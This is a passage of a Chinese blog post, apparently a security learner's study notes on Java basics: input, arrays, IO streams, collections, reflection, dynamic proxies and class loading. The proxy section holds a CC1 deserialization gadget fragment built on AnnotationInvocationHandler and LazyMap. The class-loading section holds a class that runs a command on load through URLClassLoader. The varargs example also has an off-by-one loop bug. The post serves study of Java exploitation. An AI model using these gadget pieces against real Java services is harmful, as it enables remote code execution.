class="hljs-operator">=</span> test.next()<span class="hljs-comment">;</span>System.out.println(a)<span class="hljs-comment">;</span>&#125;</code></pre></div><p>验证输入有<code>hasNextInt</code>、<code>hasNextDouble</code>等，然后使用对应的<code>nextInt</code>、<code>nextDouble</code>等接收参数</p><h2 id="命令行传参"><a href="#命令行传参" class="headerlink" title="命令行传参"></a>命令行传参</h2><p>是在src目录下运行，所以加上路径</p><div class="code-wrapper"><pre><code class="hljs stylus">java com<span class="hljs-selector-class">.boogipop</span><span class="hljs-selector-class">.www</span><span class="hljs-selector-class">.base</span><span class="hljs-selector-class">.DemoReload</span> <span class="hljs-selector-tag">i</span> am boogipop</code></pre></div><p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230911213326053.png" alt="image-20230911213326053"></p><h2 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h2><p>简单来说就是函数的参数数量不限</p><p>（参数类型 <code>...</code> 变量名）   （加三个点）</p><div class="code-wrapper"><pre><code class="hljs typescript">package org.<span class="hljs-property">example</span>.<span class="hljs-property">basic</span>;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>) &#123;        <span class="hljs-title function_">print</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">78</span>,<span class="hljs-number">32</span>,<span class="hljs-number">32</span>,<span class="hljs-number">432</span>,<span class="hljs-number">423</span>,<span class="hljs-number">423</span>,<span class="hljs-number">423</span>);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">print</span>(<span class="hljs-params">double ... <span class="hljs-built_in">number</span></span>)&#123;        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">number</span>.<span class="hljs-property">length</span>==<span class="hljs-number">0</span>)&#123;            <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;no args&quot;</span>);            <span class="hljs-keyword">return</span>;        &#125;        <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">for</span>(int i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-built_in">number</span>.<span class="hljs-property">length</span>;i++)&#123;                <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-built_in">number</span>[i]);            &#125;        &#125;    &#125;&#125;</code></pre></div><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>定义一个数组，<code>int[] num = &#123;1,2,3,4,5,6&#125;</code></p><p>然后输入<code>num.for</code></p><p>就会出来增强for循环</p><div class="code-wrapper"><pre><code class="hljs css">for (int <span class="hljs-selector-tag">i</span> : num) &#123;    &#125;</code></pre></div><p>这里的<code>i</code>相当于<code>python</code>中的<code>for i in a</code>，直接就是数组内容</p><p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230911221347848.png" alt="image-20230911221347848"></p><h2 id="Arrays"><a href="#Arrays" class="headerlink" title="Arrays"></a>Arrays</h2><p><code>Arrays.toString()</code>输出数组内容</p><p><code>Arrays.sort()</code>给数组排序</p><p><code>Arrays.fill()</code>特定值填充数据</p><div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-built_in">int</span><span class="hljs-literal">[]</span> nm = &#123;<span class="hljs-number">12</span>,<span class="hljs-number">2</span>,<span class="hljs-number">34</span>,<span class="hljs-number">15</span>,<span class="hljs-number">06</span>&#125;;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(nm);<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Arrays</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">String(<span class="hljs-params">nm</span>)</span>);<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Arrays</span>.</span></span>sort(nm);<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Arrays</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">String(<span class="hljs-params">nm</span>)</span>);<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Arrays</span>.</span></span>fill(nm,<span class="hljs-number">2</span>);<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Arrays</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">String(<span class="hljs-params">nm</span>)</span>);<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Arrays</span>.</span></span>fill(nm,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">0</span>);     #数组下标<span class="hljs-number">2</span>-<span class="hljs-number">4</span>，左闭右开，填充<span class="hljs-number">0</span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Arrays</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">String(<span class="hljs-params">nm</span>)</span>);        ##<span class="hljs-literal">[I@<span class="hljs-number">677327</span><span class="hljs-identifier">b6</span>  #数组地址</span><span class="hljs-literal">[<span class="hljs-number">12</span>, <span class="hljs-number">2</span>, <span class="hljs-number">34</span>, <span class="hljs-number">15</span>, <span class="hljs-number">6</span>]</span><span class="hljs-literal">[<span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">12</span>, <span class="hljs-number">15</span>, <span class="hljs-number">34</span>]</span><span class="hljs-literal">[<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>]</span><span class="hljs-literal">[<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>]</span></code></pre></div><h2 id="构造函数、this、this-、super、super-、this动态绑定"><a href="#构造函数、this、this-、super、super-、this动态绑定" class="headerlink" title="构造函数、this、this()、super、super()、this动态绑定"></a>构造函数、this、this()、super、super()、this动态绑定</h2><blockquote><p>this ：代表“当前对象”</p><p>this()：就是调用“当前对象”的无参构造方法<br>this、this()，new的谁就指向谁。父类里有this也是指向的new出来的对象。</p><p>this的动态绑定：包括静态方法和静态成员变量是前期绑定、访问方法是后期绑定</p><p>super：指向父类</p><p>super()：就是调用父类的无参构造方法<br>super、super()，仅指向上一级父类。</p></blockquote><p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230911224602382.png" alt="image-20230911224602382"></p><p><code>A</code>为父类，当前对象就是<code>new B</code>的<code>bb</code>，<code>s3()</code>的<code>super.s2()</code>即调用父类的<code>s2()</code>，<code>A</code>中<code>this.s1()</code>调用当前对象的<code>s1()</code>，即<code>bb</code>的<code>s1()</code>，也就是<code>B</code>中的<code>s1()</code></p><p>所以输出<code>B中的s1</code></p><p><code>A</code>不加<code>this</code>的话也是输出<code>B中的s1</code>，因为<code>B</code>为子类，相当于重写了<code>s1</code>方法</p><ul><li><h4 id="调用方法时this是指向当前对象，但是调用属性时，是指的当前类的属性"><a href="#调用方法时this是指向当前对象，但是调用属性时，是指的当前类的属性" class="headerlink" title="调用方法时this是指向当前对象，但是调用属性时，是指的当前类的属性"></a>调用方法时this是指向当前对象，但是调用属性时，是指的当前类的属性</h4></li></ul><p>两个案例理解一下这句话</p><p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230911225731256.png" alt="image-20230911225731256"></p><p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230911225746289.png" alt="image-20230911225746289"></p><h2 id="instanceof"><a href="#instanceof" class="headerlink" title="instanceof"></a>instanceof</h2><p>判断两个类之间有无父子关系</p><p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230911232058359.png" alt="image-20230911232058359"></p><h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230912102708510.png" alt="image-20230912102708510"></p><h2 id="静态代码块、匿名代码块、构造代码块"><a href="#静态代码块、匿名代码块、构造代码块" class="headerlink" title="静态代码块、匿名代码块、构造代码块"></a>静态代码块、匿名代码块、构造代码块</h2><h2 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h2><p>类似占位符，只能定义不能写</p><h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><p>跟抽象类一样</p><h2 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h2><p>套娃</p><h2 id="捕获异常"><a href="#捕获异常" class="headerlink" title="捕获异常"></a>捕获异常</h2><p>try catch finally throw throws</p><p>finally不管怎样都会执行</p><h1 id="java-io"><a href="#java-io" class="headerlink" title="java io"></a>java io</h1><h2 id="字节流"><a href="#字节流" class="headerlink" title="字节流"></a>字节流</h2><h3 id="FileOutputStream"><a href="#FileOutputStream" class="headerlink" title="FileOutputStream"></a>FileOutputStream</h3><div class="code-wrapper"><pre><code class="hljs pgsql">FileOutputStream <span class="hljs-keyword">out</span> = <span class="hljs-built_in">new</span> FileOutputStream(&quot;flag&quot;); //创建flag文件String hello = &quot;Hello World!&quot;;<span class="hljs-keyword">out</span>.<span class="hljs-keyword">write</span>(<span class="hljs-number">97</span>);<span class="hljs-keyword">out</span>.<span class="hljs-keyword">write</span>(<span class="hljs-string">&#x27;a&#x27;</span>);<span class="hljs-keyword">out</span>.<span class="hljs-keyword">write</span>(hello.getBytes());    //转为字节数组<span class="hljs-keyword">out</span>.<span class="hljs-keyword">close</span>();<span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;finish&quot;);</code></pre></div><h3 id="FileInputStream"><a href="#FileInputStream" class="headerlink" title="FileInputStream"></a>FileInputStream</h3><div class="code-wrapper"><pre><code class="hljs pgsql">FileInputStream <span class="hljs-keyword">in</span> = <span class="hljs-built_in">new</span> FileInputStream(&quot;flag&quot;);<span class="hljs-keyword">while</span> ((<span class="hljs-keyword">read</span>=<span class="hljs-keyword">in</span>.<span class="hljs-keyword">read</span>())!=<span class="hljs-number">-1</span>) &#123;          <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.printf(<span class="hljs-keyword">read</span>+&quot;,&quot;);    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.printf((<span class="hljs-type">char</span>)<span class="hljs-keyword">read</span>+&quot;,&quot;);&#125;<span class="hljs-keyword">in</span>.<span class="hljs-keyword">close</span>();</code></pre></div><p>每经过一次<code>in.read()</code>就会指向下一个内容，所以先把值赋给一个变量</p><p><code>in.read()</code>返回<code>int</code>类型</p><div class="code-wrapper"><pre><code class="hljs go">FileInputStream in = <span class="hljs-built_in">new</span> FileInputStream(<span class="hljs-string">&quot;flag&quot;</span>);<span class="hljs-type">byte</span>[] buf = <span class="hljs-built_in">new</span> <span class="hljs-type">byte</span>[<span class="hljs-number">3</span>]; <span class="hljs-comment">//</span>System.out.<span class="hljs-built_in">println</span>(in.read(buf)); <span class="hljs-comment">//把内容读入数组(缓冲区)，输出的是数组长度</span>System.out.<span class="hljs-built_in">println</span>(<span class="hljs-built_in">new</span> String(buf,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)); <span class="hljs-comment">//0为偏移，1为读取的长度，不能超过数组的长度</span>in.<span class="hljs-built_in">close</span>();</code></pre></div><h3 id="BufferedInputStream"><a href="#BufferedInputStream" class="headerlink" title="BufferedInputStream"></a>BufferedInputStream</h3><p>读入缓冲区，作用跟<code>byte[] buf = new byte[3];</code>一样</p><p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230912112835162.png" alt="image-20230912112835162"></p><div class="code-wrapper"><pre><code class="hljs pgsql">FileInputStream <span class="hljs-keyword">in</span> = <span class="hljs-built_in">new</span> FileInputStream(&quot;flag&quot;);BufferedInputStream bif = <span class="hljs-built_in">new</span> BufferedInputStream(<span class="hljs-keyword">in</span>);<span class="hljs-keyword">while</span> ((<span class="hljs-keyword">read</span>=bif.<span class="hljs-keyword">read</span>())!=<span class="hljs-number">-1</span>)&#123;    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.print((<span class="hljs-type">char</span>)<span class="hljs-keyword">read</span>);&#125;bif.<span class="hljs-keyword">close</span>(); //也会关闭<span class="hljs-keyword">in</span></code></pre></div><h3 id="BufferedOutputStream"><a href="#BufferedOutputStream" class="headerlink" title="BufferedOutputStream"></a>BufferedOutputStream</h3><div class="code-wrapper"><pre><code class="hljs reasonml">FileOutputStream out=<span class="hljs-keyword">new</span> <span class="hljs-constructor">FileOutputStream(<span class="hljs-string">&quot;1.txt&quot;</span>)</span>;BufferedOutputStream bos=<span class="hljs-keyword">new</span> <span class="hljs-constructor">BufferedOutputStream(<span class="hljs-params">out</span>)</span>;<span class="hljs-keyword">for</span>(<span class="hljs-built_in">int</span> i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">10</span>;i++)&#123;     bos.write(<span class="hljs-string">&quot;helloworld,&quot;</span>.get<span class="hljs-constructor">Bytes()</span>); <span class="hljs-comment">//到这一步不会写入文件，只是写入了缓冲区</span>     bos.flush<span class="hljs-literal">()</span>;<span class="hljs-comment">//刷新缓冲区写入文件</span>&#125;bos.close<span class="hljs-literal">()</span>;<span class="hljs-comment">//关闭的时候也会调用flush，同时关闭out</span></code></pre></div><h3 id="ObjectInputStream和ObjectOutputStream"><a href="#ObjectInputStream和ObjectOutputStream" class="headerlink" title="ObjectInputStream和ObjectOutputStream"></a>ObjectInputStream和ObjectOutputStream</h3><p>序列化与反序列化</p><p>重写方法</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(ObjectOutputStream s)</span><span class="hljs-keyword">throws</span> java.io.IOException<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream oos)</span><span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException&#123;oos.defaultReadObject();&#125;</code></pre></div><h2 id="字符流"><a href="#字符流" class="headerlink" title="字符流"></a>字符流</h2><p>使用字节流读取中文会出现乱码</p><h3 id="FileReader"><a href="#FileReader" class="headerlink" title="FileReader"></a>FileReader</h3><div class="code-wrapper"><pre><code class="hljs gradle">FileReader fr=<span class="hljs-keyword">new</span> FileReader(<span class="hljs-string">&quot;resource/test.txt&quot;</span>);<span class="hljs-keyword">char</span>[] buf=<span class="hljs-keyword">new</span> <span class="hljs-keyword">char</span>[<span class="hljs-number">1024</span>]; <span class="hljs-comment">//创建一个缓冲区</span><span class="hljs-keyword">int</span> <span class="hljs-keyword">count</span>=<span class="hljs-number">0</span>;<span class="hljs-keyword">while</span>((<span class="hljs-keyword">count</span>=fr.<span class="hljs-keyword">read</span>(buf))!=-<span class="hljs-number">1</span>)&#123;    System.out.<span class="hljs-keyword">println</span>(<span class="hljs-keyword">new</span> String(buf,<span class="hljs-number">0</span>,<span class="hljs-keyword">count</span>));</code></pre></div><h3 id="FileWriter"><a href="#FileWriter" class="headerlink" title="FileWriter"></a>FileWriter</h3><div class="code-wrapper"><pre><code class="hljs abnf">FileWriter fw<span class="hljs-operator">=</span>new FileWriter(<span class="hljs-string">&quot;writer.txt&quot;</span>)<span class="hljs-comment">;</span>//写入for(int i<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-comment">;i&lt;10;i++)&#123;</span>    fw.write(<span class="hljs-string">&quot;java is the best&quot;</span>)<span class="hljs-comment">;</span>    fw.flush()<span class="hljs-comment">;</span>&#125;fw.close()<span class="hljs-comment">;</span></code></pre></div><h3 id="BufferReader"><a href="#BufferReader" class="headerlink" title="BufferReader"></a>BufferReader</h3><h2 id="转换流"><a href="#转换流" class="headerlink" title="转换流"></a>转换流</h2><p><code>InputStreamReader/OutputStreamWriter</code></p><ul><li>可将字节流变为转换流</li><li>可设置字符的编码方式</li></ul><div class="code-wrapper"><pre><code class="hljs reasonml">FileInputStream fs= <span class="hljs-keyword">new</span> <span class="hljs-constructor">FileInputStream(<span class="hljs-string">&quot;resource/test.txt&quot;</span>)</span>; InputStreamReader isr=<span class="hljs-keyword">new</span> <span class="hljs-constructor">InputStreamReader(<span class="hljs-params">fs</span>,<span class="hljs-string">&quot;utf-8&quot;</span>)</span>;<span class="hljs-comment">//传入字节流,转换流指定utf-8编码</span> <span class="hljs-comment">//读取文件</span> <span class="hljs-built_in">int</span> data=<span class="hljs-number">0</span>; <span class="hljs-keyword">while</span>((data=isr.read<span class="hljs-literal">()</span>)!=-<span class="hljs-number">1</span>)&#123;     <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println((<span class="hljs-built_in">char</span>)data); &#125; isr.close<span class="hljs-literal">()</span>;</code></pre></div><div class="code-wrapper"><pre><code class="hljs reasonml">FileOutputStream fo=<span class="hljs-keyword">new</span> <span class="hljs-constructor">FileOutputStream(<span class="hljs-string">&quot;fo.txt&quot;</span>)</span>;OutputStreamWriter osw=<span class="hljs-keyword">new</span> <span class="hljs-constructor">OutputStreamWriter(<span class="hljs-params">fo</span>,<span class="hljs-string">&quot;GBK&quot;</span>)</span>; <span class="hljs-comment">//gbk编码写入</span><span class="hljs-keyword">for</span>(<span class="hljs-built_in">int</span> i=<span class="hljs-number">1</span>;i&lt;=<span class="hljs-number">10</span>;i++)&#123;    osw.write(<span class="hljs-string">&quot;我是傻逼&quot;</span>);    osw.flush<span class="hljs-literal">()</span>;&#125;osw.close<span class="hljs-literal">()</span>;</code></pre></div><h1 id="类"><a href="#类" class="headerlink" title="类"></a>类</h1><h2 id="Object类"><a href="#Object类" class="headerlink" title="Object类"></a>Object类</h2><h4 id="equals"><a href="#equals" class="headerlink" title="equals()"></a>equals()</h4><blockquote><p>&#x3D;&#x3D; 基础类型对比的是值是否相同，引用类型对比的是引用是否相同；<br>equals只是单单的比较值</p></blockquote><div class="code-wrapper"><pre><code class="hljs abnf">        String s1 <span class="hljs-operator">=</span> <span class="hljs-string">&quot;string&quot;</span><span class="hljs-comment">;</span>        String s2 <span class="hljs-operator">=</span> <span class="hljs-string">&quot;string&quot;</span><span class="hljs-comment">;</span>        String s3 <span class="hljs-operator">=</span> new String(<span class="hljs-string">&quot;string&quot;</span>)<span class="hljs-comment">;</span>        System.out.println(s1<span class="hljs-operator">=</span><span class="hljs-operator">=</span>s2)<span class="hljs-comment">;</span>        System.out.println(s1<span class="hljs-operator">=</span><span class="hljs-operator">=</span>s3)<span class="hljs-comment">;</span>        System.out.println(s1.equals(s2))<span class="hljs-comment">;</span>        System.out.println(s1.equals(s3))<span class="hljs-comment">;</span>        /*truefalsetruetrue*/</code></pre></div><h2 id="String类"><a href="#String类" class="headerlink" title="String类"></a>String类</h2><p>str.charAt(str.length()-1)       &#x2F;&#x2F;里面的数字相当于数组下标</p><div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>charAt();返回对应下标的字符<span class="hljs-regexp">//</span>toCharArray();返回字符串对应数组<span class="hljs-regexp">//i</span>ndexOf(<span class="hljs-string">&#x27;asd&#x27;</span>);返回字符串首次出现位置<span class="hljs-regexp">//</span>lastIndexOf(<span class="hljs-string">&#x27;asd&#x27;</span>);返回字符串最后一次出现的位置</code></pre></div><h1 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h1><h2 id="Collection接口"><a href="#Collection接口" class="headerlink" title="Collection接口"></a>Collection接口</h2><div class="code-wrapper"><pre><code class="hljs abnf">Collection col <span class="hljs-operator">=</span> new Arraylist()<span class="hljs-comment">;</span>col.add(s1)<span class="hljs-comment">;</span>col.add(s2)<span class="hljs-comment">;</span>col.add(s3)<span class="hljs-comment">;</span>Iterator it <span class="hljs-operator">=</span> col.iterator()<span class="hljs-comment">;  //迭代器</span>while(it.hasNext())&#123;System.out.println(it.next())<span class="hljs-comment">;</span>&#125;</code></pre></div><h2 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h2><p>实际上就是常见的<T></p><h2 id="Map集合"><a href="#Map集合" class="headerlink" title="Map集合"></a>Map集合</h2><div class="code-wrapper"><pre><code class="hljs arduino"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">String</span>[] args)</span> throws IOException </span>&#123;        Map&lt;<span class="hljs-type">String</span>,<span class="hljs-type">String</span>&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-built_in">HashMap</span>&lt;<span class="hljs-type">String</span>, <span class="hljs-type">String</span>&gt;();        map.<span class="hljs-built_in">put</span>(<span class="hljs-string">&quot;cn&quot;</span>,<span class="hljs-string">&quot;中国&quot;</span>);        map.<span class="hljs-built_in">put</span>(<span class="hljs-string">&quot;usa&quot;</span>,<span class="hljs-string">&quot;美国&quot;</span>);        map.<span class="hljs-built_in">put</span>(<span class="hljs-string">&quot;uk&quot;</span>,<span class="hljs-string">&quot;英国&quot;</span>);        <span class="hljs-comment">//遍历map</span>        Set&lt;<span class="hljs-type">String</span>&gt; keyset = map.<span class="hljs-built_in">keySet</span>();        <span class="hljs-keyword">for</span> (<span class="hljs-type">String</span> s : map.<span class="hljs-built_in">keySet</span>()) &#123;            System.out.<span class="hljs-built_in">println</span>(s+<span class="hljs-string">&quot;--------&quot;</span>+map.<span class="hljs-built_in">get</span>(s));        &#125;        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;----------entryset---------&quot;</span>);        Set&lt;Map.Entry&lt;<span class="hljs-type">String</span>,<span class="hljs-type">String</span>&gt;&gt; entries = map.<span class="hljs-built_in">entrySet</span>();        <span class="hljs-keyword">for</span> (Map.Entry&lt;<span class="hljs-type">String</span>, <span class="hljs-type">String</span>&gt; entry : entries) &#123;            System.out.<span class="hljs-built_in">println</span>(entry.<span class="hljs-built_in">getKey</span>()+<span class="hljs-string">&quot;------&quot;</span>+entry.<span class="hljs-built_in">getValue</span>());        &#125;    &#125;&#125;</code></pre></div><p>WOW，<code>entryset</code>，跟CC1的有一步骤有关</p><h2 id="注解与反射"><a href="#注解与反射" class="headerlink" title="注解与反射"></a>注解与反射</h2><div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-params">className</span>, <span class="hljs-params">true</span>, <span class="hljs-params">currentLoader</span>)</span></code></pre></div><p>第⼆个参数表示是否初始化，在 forName 的时候，构造函数并不会执⾏，而是执⾏类初始化。他会执行<code>static&#123;&#125;</code>静态块里面的内容</p><p>newInstance()     对类进行实例化</p><p>但需要注意的是，invoke 方法第一个参数并不是固定的：</p><p><strong>如果调用这个方法是普通方法，第一个参数就是类对象；</strong></p><p><strong>如果调用这个方法是静态方法，第一个参数就是类；</strong></p><p>如果调用的方法是静态方法。那么invoke<code>方法传入的第一个参数永远为</code>null</p><h1 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h1><div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-keyword">new</span><span class="hljs-constructor">ProxyInstance(ClassLoader <span class="hljs-params">loader</span>, 类&lt;?&gt;[] <span class="hljs-params">interfaces</span>, InvocationHandler <span class="hljs-params">h</span>)</span> throws IllegalArgumentException</code></pre></div><ul><li><code>loader</code> – 类加载器来定义<strong>代理类</strong></li><li><code>interfaces</code> – 代理类实现的<strong>接口列表</strong></li><li><code>h</code> – 调度方法调用的调用<strong>处理函数</strong></li></ul><div class="code-wrapper"><pre><code class="hljs gradle">Hello hello = (Hello) Proxy.newProxyInstance(            Hello.<span class="hljs-keyword">class</span>.getClassLoader(), <span class="hljs-comment">// 传入ClassLoader</span>            <span class="hljs-keyword">new</span> <span class="hljs-keyword">Class</span>[] &#123; Hello.<span class="hljs-keyword">class</span> &#125;, <span class="hljs-comment">// 传入要实现的接口</span>            handler); <span class="hljs-comment">// 传入处理调用方法的InvocationHandler</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Proxy</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">ProxyInstance(<span class="hljs-params">ordinaryStudents</span>.<span class="hljs-params">getClass</span>()</span>.get<span class="hljs-constructor">ClassLoader()</span>, ordinaryStudents.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">Interfaces()</span>, handler)</code></pre></div><p>通常是这两句，参数调整一下</p><div class="code-wrapper"><pre><code class="hljs reasonml">InvocationHandler instance = (InvocationHandler) constructor.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(Target.<span class="hljs-params">class</span>,<span class="hljs-params">lazymap</span>)</span>;Map proxyInstance = (Map) <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Proxy</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">ProxyInstance(LazyMap.<span class="hljs-params">class</span>.<span class="hljs-params">getClassLoader</span>()</span>,<span class="hljs-keyword">new</span> Class<span class="hljs-literal">[]</span>&#123;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Map</span>.</span></span><span class="hljs-keyword">class</span>&#125;,instance);</code></pre></div><div class="code-wrapper"><pre><code class="hljs reasonml">Class c = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>)</span>;Constructor constructor = c.get<span class="hljs-constructor">DeclaredConstructor(Class.<span class="hljs-params">class</span>,Map.<span class="hljs-params">class</span>)</span>;constructor.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;InvocationHandler instance = (InvocationHandler) constructor.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(Target.<span class="hljs-params">class</span>,<span class="hljs-params">lazymap</span>)</span>;Map proxyInstance = (Map) <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Proxy</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">ProxyInstance(LazyMap.<span class="hljs-params">class</span>.<span class="hljs-params">getClassLoader</span>()</span>,<span class="hljs-keyword">new</span> Class<span class="hljs-literal">[]</span>&#123;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Map</span>.</span></span><span class="hljs-keyword">class</span>&#125;,instance);Object o = constructor.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(Override.<span class="hljs-params">class</span>,<span class="hljs-params">proxyInstance</span>)</span>;</code></pre></div><h1 id="类加载"><a href="#类加载" class="headerlink" title="类加载"></a>类加载</h1><p>BootstrapClassLoader     ExtensionsClassLoader     AppClassLoader</p><h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h2><p>①：URL未以斜杠 &#x2F; 结尾，则认为是一个JAR文件，使用 <code>JarLoader</code> 来寻找类，即为在Jar包中寻找.class文件</p><p>②：URL以斜杠 &#x2F; 结尾，且协议名是 <code>file</code> ，则使用 <code>FileLoader</code> 来寻找类，即为在本地文件系统中寻找.class文件</p><p>③：URL以斜杠 &#x2F; 结尾，且协议名不是 <code>file</code> ，则使用最基础的 <code>Loader</code> 来寻找类。</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ctf.bcel;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">calc</span> &#123;    <span class="hljs-keyword">static</span>&#123;        <span class="hljs-keyword">try</span> &#123;            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;</code></pre></div><p>file:&#x2F;&#x2F;       路径为<code>.class</code>文件所在路径</p><div class="code-wrapper"><pre><code class="hljs swift"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BCELDemo</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-type">String</span>[] args) <span class="hljs-keyword">throws</span> <span class="hljs-type">Exception</span> &#123;        <span class="hljs-type">URLClassLoader</span> urlClassLoader <span class="hljs-operator">=</span> new <span class="hljs-type">URLClassLoader</span>(new <span class="hljs-type">URL</span>[]&#123;new <span class="hljs-type">URL</span>(<span class="hljs-string">&quot;file://C:<span class="hljs-subst">\\</span>Users<span class="hljs-subst">\\</span>86136<span class="hljs-subst">\\</span>Desktop<span class="hljs-subst">\\</span>rmi<span class="hljs-subst">\\</span>out<span 